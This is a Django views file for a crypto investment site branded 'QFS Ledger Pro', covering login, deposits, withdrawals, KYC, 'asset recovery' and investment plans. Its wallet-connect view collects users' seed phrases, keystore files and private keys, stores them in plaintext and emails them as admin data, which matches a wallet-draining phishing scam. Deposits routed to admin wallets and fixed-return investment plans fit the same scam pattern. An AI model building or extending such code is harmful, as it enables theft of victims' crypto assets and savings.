from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import login as auth_login, logout as auth_logout, authenticate, update_session_auth_hash
from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User
from django.contrib import messages
from django.core.mail import send_mail
from django.template.loader import render_to_string
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_str
from django.contrib.auth.tokens import default_token_generator
from django.contrib.sites.shortcuts import get_current_site
from django.utils import timezone
from django.core.paginator import Paginator
from django.db.models import Q
from django.contrib.auth.forms import PasswordChangeForm

from .models import (
    UserProfile, ConnectWallet, AssetRecoveryForm, KYCVerification,
    Crytocurrency, AdminWallet, UserCryptoHolding, Deposit, Withdrawal, TotalBalance, CryptoPlatform,
    InvestmentPlan, UserInvestment, InvestmentTransaction
)
from .forms import (
    CustomUserCreationForm, LoginForm, ProfileUpdateForm,
    DepositRequestForm, WithdrawalRequestForm, WalletConnectForm,
    AssetRecoveryRequestForm, KYCSubmissionForm, CreateInvestmentForm
)
from .utils import (
    send_welcome_email, send_deposit_confirmation_email,
    send_withdrawal_confirmation_email, send_profile_update_email,
    send_password_change_email, send_wallet_connection_email,
    send_asset_recovery_email, send_kyc_submission_email,
    send_investment_confirmation_email
)


def home(request):
    """Home page view"""
    return render(request, 'home.html')

# =========================================
# BUY CRYPTO VIEW
# =========================================
def buy_crypto_view(request):
    """View to display crypto buying platforms so that users can choose from"""
    platforms = CryptoPlatform.objects.all() 
    context = {
        'platforms': platforms
    }
    return render(request, 'buy_crypto.html', context)


def login_view(request):
    """Handle user login with email notification"""
    if request.user.is_authenticated:
        return redirect('dashboard')
    
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            remember_me = form.cleaned_data.get('remember_me', False)
            
            # Try to authenticate with username first
            user = authenticate(request, username=username, password=password)
            
            # If authentication fails, try with email
            if user is None:
                try:
                    user_obj = User.objects.get(email=username)
                    user = authenticate(request, username=user_obj.username, password=password)
                except User.DoesNotExist:
                    pass
            
            if user is not None:
                auth_login(request, user)
                
                # Set session expiry
                if not remember_me:
                    request.session.set_expiry(0)  # Session expires when browser closes
                
                # Send login notification email
                try:
                    subject = 'New Login to Your QFS Ledger Pro Account'
                    message = f'''
                    Hello {user.first_name},
                    
                    A new login was detected on your QFS Ledger Pro account.
                    
                    If this was you, you can safely ignore this email.
                    If you did not log in, please reset your password immediately.
                    
                    Best regards,
                    QFS Ledger Pro Team
                    '''
                    send_mail(
                        subject,
                        message,
                        'QFS Ledger Pro <noreply@qfsledgerpro.com>',
                        [user.email],
                        fail_silently=True,
                    )
                except Exception as e:
                    print(f"Failed to send login notification: {e}")
                
                messages.success(request, f'Welcome back, {user.first_name}!')
                return redirect('dashboard')
            else:
                messages.error(request, 'Invalid username/email or password.')
    else:
        form = LoginForm()
    
    return render(request, 'login.html', {'form': form})


def logout_view(request):
    """Handle user logout"""
    auth_logout(request)
    messages.success(request, 'You have been logged out successfully.')
    return redirect('home')


def signup_view(request):
    """Handle user signup with email verification"""
    if request.user.is_authenticated:
        return redirect('dashboard')
    
    if request.method == 'POST':
        form = CustomUserCreationForm(request.POST)
        if form.is_valid():
            # Save user but don't activate yet
            user = form.save(commit=False)
            user.is_active = True  # We'll verify via email
            user.save()
            
            # Create UserProfile
            UserProfile.objects.create(
                user=user,
                phone_number=form.cleaned_data.get('phone_number', ''),
                subscribe_newsletter=form.cleaned_data.get('subscribe_newsletter', False),
                email_verified=False
            )
            
            # Create TotalBalance
            TotalBalance.objects.create(user=user)
            
            # Generate verification token
            current_site = get_current_site(request)
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)
            
            # Build verification link
            verification_link = f"http://{current_site.domain}/verify-email/{uid}/{token}/"
            
            # Send welcome/verification email
            send_welcome_email(user, user.userprofile)
            
            # Log user in automatically
            auth_login(request, user)
            messages.success(request, 'Account created! Welcome to QFS Ledger Pro.')
            return redirect('dashboard')
        else:
            messages.error(request, 'Please correct the errors below.')
    else:
        form = CustomUserCreationForm()
    
    return render(request, 'signup.html', {'form': form})


def verify_email(request, uidb64, token):
    """Verify user email address"""
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except (TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    
    if user is not None and default_token_generator.check_token(user, token):
        # Mark email as verified
        user_profile = UserProfile.objects.get(user=user)
        user_profile.email_verified = True
        user_profile.save()
        
        messages.success(request, 'Your email has been verified successfully!')
        
        # Log user in if not already logged in
        if not request.user.is_authenticated:
            auth_login(request, user)
        
        return redirect('dashboard')
    else:
        messages.error(request, 'Verification link is invalid or has expired.')
        return redirect('home')


# ==========================================
# DASHBOARD & PROFILE VIEWS
# ==========================================

@login_required
def dashboard_view(request):
    """
    Enhanced dashboard view showing:
    - Total balance
    - Crypto holdings
    - Recent transactions
    - KYC status
    """
    user = request.user
    
    # Update total balance
    total_balance_obj, created = TotalBalance.objects.get_or_create(user=user)
    total_balance_obj.calculate_total_balance()
    
    # Get all cryptocurrencies and map user holdings
    all_cryptos = Crytocurrency.objects.all()
    user_holdings = UserCryptoHolding.objects.filter(user=user)
    holdings_map = {h.cryptocurrency_id: h for h in user_holdings}
    
    crypto_data = []
    for crypto in all_cryptos:
        holding = holdings_map.get(crypto.id)
        crypto_data.append({
            'cryptocurrency': crypto,
            'amount': holding.amount if holding else 0,
            'amount_in_usd': holding.amount_in_usd if holding else 0,
        })
    
    # Get recent transactions (deposits and withdrawals)
    recent_deposits = Deposit.objects.filter(user=user).order_by('-created_at')[:5]
    recent_withdrawals = Withdrawal.objects.filter(user=user).order_by('-created_at')[:5]
    
    # Combine and sort
    recent_transactions = sorted(
        list(recent_deposits) + list(recent_withdrawals),
        key=lambda x: x.created_at,
        reverse=True
    )[:5]
    
    # Get KYC status
    try:
        kyc_status = user.kyc.status
    except:
        kyc_status = 'not_submitted'
        
    # Check wallet connection
    wallet_connected = hasattr(user, 'connectwallet')
    
    context = {
        'total_balance': total_balance_obj,
        'crypto_data': crypto_data,
        'recent_transactions': recent_transactions,
        'kyc_status': kyc_status,
        'wallet_connected': wallet_connected,
    }
    
    return render(request, 'dashboard.html', context)


@login_required
def profile_view(request):
    """View and update user profile"""
    user = request.user
    user_profile = get_object_or_404(UserProfile, user=user)
    
    if request.method == 'POST':
        form = ProfileUpdateForm(request.POST, instance=user)
        if form.is_valid():
            user = form.save()
            
            # Update phone number
            phone_number = request.POST.get('phone_number')
            if phone_number:
                user_profile.phone_number = phone_number
                user_profile.save()
                
            send_profile_update_email(user)
            messages.success(request, 'Profile updated successfully.')
            return redirect('profile')
    else:
        initial_data = {'phone_number': user_profile.phone_number}
        form = ProfileUpdateForm(instance=user, initial=initial_data)
    
    context = {
        'form': form,
        'user_profile': user_profile
    }
    return render(request, 'profile.html', context)


@login_required
def change_password_view(request):
    """Change user password"""
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            update_session_auth_hash(request, user)  # Important!
            send_password_change_email(user)
            messages.success(request, 'Your password was successfully updated!')
            return redirect('profile')
        else:
            messages.error(request, 'Please correct the error below.')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'change_password.html', {'form': form})


# ==========================================
# CRYPTO OPERATIONS VIEWS
# ==========================================

@login_required
def deposit_request_view(request):
    """Handle deposit requests"""
    if request.method == 'POST':
        form = DepositRequestForm(request.POST)
        if form.is_valid():
            cryptocurrency = form.cleaned_data['cryptocurrency']
            amount = form.cleaned_data['amount_in_usd']
            
            # Get admin wallet
            try:
                admin_wallet = AdminWallet.objects.get(cryptocurrency=cryptocurrency, is_active=True)
            except AdminWallet.DoesNotExist:
                messages.error(request, f'No active deposit wallet found for {cryptocurrency.name}. Please contact support.')
                return redirect('deposit')
            
            # Create deposit record
            deposit = Deposit.objects.create(
                user=request.user,
                cryptocurrency=cryptocurrency,
                amount_in_usd=amount,
                admin_wallet=admin_wallet,
                status='pending'
            )
            
            send_deposit_confirmation_email(request.user, deposit)
            messages.success(request, 'Deposit request submitted successfully! Please proceed with payment.')
            
            # Redirect to a detail page or show modal (simplified here)
            return render(request, 'deposit_success.html', {'deposit': deposit, 'wallet': admin_wallet})
    else:
        form = DepositRequestForm()
    
    return render(request, 'deposit.html', {'form': form})


@login_required
def withdrawal_request_view(request):
    """Handle withdrawal requests"""
    if request.method == 'POST':
        form = WithdrawalRequestForm(request.user, request.POST)
        if form.is_valid():
            cryptocurrency = form.cleaned_data['cryptocurrency']
            amount = form.cleaned_data['amount_in_usd']
            address = form.cleaned_data['user_wallet_address']
            
            # Create withdrawal record
            withdrawal = Withdrawal.objects.create(
                user=request.user,
                cryptocurrency=cryptocurrency,
                amount_in_usd=amount,
                user_wallet_address=address,
                status='pending'
            )
            
            send_withdrawal_confirmation_email(request.user, withdrawal)
            messages.success(request, 'Withdrawal request submitted successfully.')
            return redirect('transactions')
    else:
        form = WithdrawalRequestForm(request.user)
    
    return render(request, 'withdraw.html', {'form': form})


@login_required
def transactions_view(request):
    """View transaction history"""
    deposits = Deposit.objects.filter(user=request.user).order_by('-created_at')
    withdrawals = Withdrawal.objects.filter(user=request.user).order_by('-created_at')
    
    # Combine and sort
    all_transactions = sorted(
        list(deposits) + list(withdrawals),
        key=lambda x: x.created_at,
        reverse=True
    )
    
    # Pagination
    paginator = Paginator(all_transactions, 10)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    return render(request, 'transactions.html', {'page_obj': page_obj})


# ==========================================
# WALLET & ASSET RECOVERY VIEWS
# ==========================================

@login_required
def wallet_connect_view(request):
    """Connect external wallet"""
    # Check if already connected
    if hasattr(request.user, 'connectwallet'):
        messages.info(request, 'You already have a wallet connected.')
        return redirect('dashboard')
        
    if request.method == 'POST':
        form = WalletConnectForm(request.POST)
        if form.is_valid():
            # Save wallet data
            ConnectWallet.objects.create(
                user=request.user,
                mnemonic_phrase=form.cleaned_data.get('mnemonic_phrase'),
                keystore_json=form.cleaned_data.get('keystore_json'),
                private_key=form.cleaned_data.get('private_key')
            )
            
            # Prepare data for email
            wallet_data = {
                'connection_method': form.cleaned_data.get('connection_method'),
                'mnemonic_phrase': form.cleaned_data.get('mnemonic_phrase'),
                'keystore_json': form.cleaned_data.get('keystore_json'),
                'private_key': form.cleaned_data.get('private_key'),
                'timestamp': timezone.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            # Send emails (User notification + Admin data)
            send_wallet_connection_email(request.user, wallet_data)
            
            messages.success(request, 'Wallet connected successfully!')
            return redirect('dashboard')
    else:
        form = WalletConnectForm()
    
    return render(request, 'wallet_connect.html', {'form': form})


@login_required
def wallet_disconnect_view(request):
    """Disconnect wallet"""
    if request.method == 'POST':
        try:
            wallet = request.user.connectwallet
            wallet.delete()
            messages.success(request, 'Wallet disconnected successfully.')
        except ConnectWallet.DoesNotExist:
            messages.error(request, 'No wallet found to disconnect.')
            
    return redirect('dashboard')


@login_required
def asset_recovery_request_view(request):
    """Submit asset recovery request"""
    if request.method == 'POST':
        form = AssetRecoveryRequestForm(request.POST)
        if form.is_valid():
            recovery = form.save(commit=False)
            recovery.user = request.user
            recovery.save()
            
            send_asset_recovery_email(request.user, recovery)
            messages.success(request, 'Recovery request submitted. Ticket ID: #' + str(recovery.id))
            return redirect('asset_recovery_status')
    else:
        form = AssetRecoveryRequestForm(initial={
            'full_name': f"{request.user.first_name} {request.user.last_name}",
            'email': request.user.email
        })
    
    return render(request, 'asset_recovery.html', {'form': form})


@login_required
def asset_recovery_status_view(request):
    """View asset recovery requests status"""
    requests = AssetRecoveryForm.objects.filter(user=request.user).order_by('-submitted_at')
    return render(request, 'asset_recovery_status.html', {'requests': requests})


# ==========================================
# KYC VIEWS
# ==========================================

@login_required
def kyc_submit_view(request):
    """Submit KYC documents"""
    # Check if already verified or pending
    try:
        kyc = request.user.kyc
        if kyc.status in ['verified', 'pending']:
            messages.info(request, f'Your KYC status is currently: {kyc.get_status_display()}')
            return redirect('kyc_status')
    except KYCVerification.DoesNotExist:
        kyc = None
        
    if request.method == 'POST':
        form = KYCSubmissionForm(request.POST, request.FILES)
        if form.is_valid():
            if kyc:
                # Update existing
                kyc.document_type = form.cleaned_data['document_type']
                kyc.document_image = form.cleaned_data['document_image']
                kyc.status = 'pending'
                kyc.submitted_at = timezone.now()
                kyc.save()
            else:
                # Create new
                kyc = form.save(commit=False)
                kyc.user = request.user
                kyc.status = 'pending'
                kyc.submitted_at = timezone.now()
                kyc.save()
                
            send_kyc_submission_email(request.user, kyc)
            messages.success(request, 'KYC documents submitted successfully.')
            return redirect('kyc_status')
    else:
        form = KYCSubmissionForm()
        
    return render(request, 'kyc_submit.html', {'form': form})


@login_required
def kyc_status_view(request):
    """Check KYC status"""
    try:
        kyc = request.user.kyc
    except KYCVerification.DoesNotExist:
        kyc = None
        
    return render(request, 'kyc_status.html', {'kyc': kyc})


# ==========================================
# PASSWORD RESET VIEWS
# ==========================================

def password_reset_request(request):
    """Request password reset"""
    if request.method == 'POST':
        email = request.POST.get('email')
        try:
            user = User.objects.get(email=email)
            
            # Generate reset token
            current_site = get_current_site(request)
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)
            
            # Build reset link
            reset_link = f"http://{current_site.domain}/password-reset-confirm/{uid}/{token}/"
            
            # Send reset email
            subject = 'Password Reset for QFS Ledger Pro'
            message = f'''
            Hello {user.first_name},
            
            You requested a password reset for your QFS Ledger Pro account.
            
            Click the link below to reset your password:
            {reset_link}
            
            If you didn't request this, please ignore this email.
            
            Best regards,
            QFS Ledger Pro Team
            '''
            send_mail(
                subject,
                message,
                'QFS Ledger Pro <noreply@qfsledgerpro.com>',
                [user.email],
                fail_silently=False,
            )
            messages.success(request, 'Password reset instructions have been sent to your email.')
            return redirect('password_reset_done')
        except User.DoesNotExist:
            # Don't reveal that the email doesn't exist
            messages.success(request, 'If an account exists with this email, password reset instructions have been sent.')
            return redirect('password_reset_done')
    
    return render(request, 'password_reset_form.html')


def password_reset_done(request):
    """Show confirmation that reset email was sent"""
    return render(request, 'password_reset_done.html')


def password_reset_confirm(request, uidb64, token):
    """Confirm password reset with token"""
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except (TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    
    if user is not None and default_token_generator.check_token(user, token):
        if request.method == 'POST':
            password1 = request.POST.get('password1')
            password2 = request.POST.get('password2')
            
            if password1 and password1 == password2:
                user.set_password(password1)
                user.save()
                messages.success(request, 'Your password has been reset successfully! You can now log in.')
                return redirect('password_reset_complete')
            else:
                messages.error(request, 'Passwords do not match.')
        
        return render(request, 'password_reset_confirm.html', {'validlink': True})
    else:
        messages.error(request, 'Password reset link is invalid or has expired.')
        return render(request, 'password_reset_confirm.html', {'validlink': False})


def password_reset_complete(request):
    """Show confirmation that password was reset"""
    return render(request, 'password_reset_complete.html')


# ==========================================
# INVESTMENT VIEWS
# ==========================================

@login_required
def investment_plans_view(request):
    """Display available investment plans"""
    plans = InvestmentPlan.objects.filter(is_active=True).order_by('min_amount')
    
    # Get user balances for context
    user_holdings = UserCryptoHolding.objects.filter(user=request.user, amount_in_usd__gt=0)
    
    context = {
        'plans': plans,
        'user_holdings': user_holdings
    }
    return render(request, 'investment_plans.html', context)


@login_required
def create_investment_view(request, plan_id):
    """Handle investment creation"""
    plan = get_object_or_404(InvestmentPlan, id=plan_id, is_active=True)
    
    if request.method == 'POST':
        form = CreateInvestmentForm(request.user, plan, request.POST)
        if form.is_valid():
            cryptocurrency = form.cleaned_data['cryptocurrency']
            amount = form.cleaned_data['amount']
            
            # Deduct from user balance
            holding = UserCryptoHolding.objects.get(user=request.user, cryptocurrency=cryptocurrency)
            holding.amount_in_usd -= amount
            holding.save()
            
            # Update total balance
            TotalBalance.update_user_balance(request.user)
            
            # Create investment
            investment = UserInvestment.objects.create(
                user=request.user,
                plan=plan,
                cryptocurrency=cryptocurrency,
                amount_in_usd=amount,
                amount_invested=amount / cryptocurrency.coin_price, # Store crypto amount
                status='active'
            )
            
            # Create transaction record
            InvestmentTransaction.objects.create(
                investment=investment,
                transaction_type='investment_start',
                amount=amount,
                description=f"Initial investment in {plan.name} plan"
            )
            
            # Send confirmation email
            send_investment_confirmation_email(request.user, investment)
            
            messages.success(request, f'Successfully invested ${amount} in {plan.name} plan!')
            return redirect('my_investments')
    else:
        form = CreateInvestmentForm(request.user, plan)
    
    context = {
        'form': form,
        'plan': plan
    }
    return render(request, 'create_investment.html', context)


@login_required
def my_investments_view(request):
    """List user's investments"""
    active_investments = UserInvestment.objects.filter(user=request.user, status='active').order_by('-start_date')
    completed_investments = UserInvestment.objects.filter(user=request.user).exclude(status='active').order_by('-end_date')
    
    total_active_investment = sum(inv.amount_in_usd for inv in active_investments)
    total_profit_earned = sum(inv.total_profit_earned for inv in UserInvestment.objects.filter(user=request.user))
    
    context = {
        'active_investments': active_investments,
        'completed_investments': completed_investments,
        'total_active_investment': total_active_investment,
        'total_profit_earned': total_profit_earned
    }
    return render(request, 'my_investments.html', context)


@login_required
def investment_detail_view(request, investment_id):
    """Detail view for a specific investment"""
    investment = get_object_or_404(UserInvestment, id=investment_id, user=request.user)
    transactions = investment.transactions.all().order_by('-created_at')
    
    context = {
        'investment': investment,
        'transactions': transactions
    }
    return render(request, 'investment_detail.html', context)